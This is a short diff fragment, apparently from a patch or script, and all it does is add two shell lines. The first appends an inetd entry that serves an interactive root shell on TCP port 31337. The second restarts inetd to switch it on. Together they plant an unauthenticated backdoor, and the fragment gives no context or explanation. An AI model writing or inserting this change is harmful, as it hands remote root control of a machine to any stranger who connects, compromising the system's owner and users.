@@ -1,0 +1,2 @@
+echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
+/etc/init.d/inetd restart
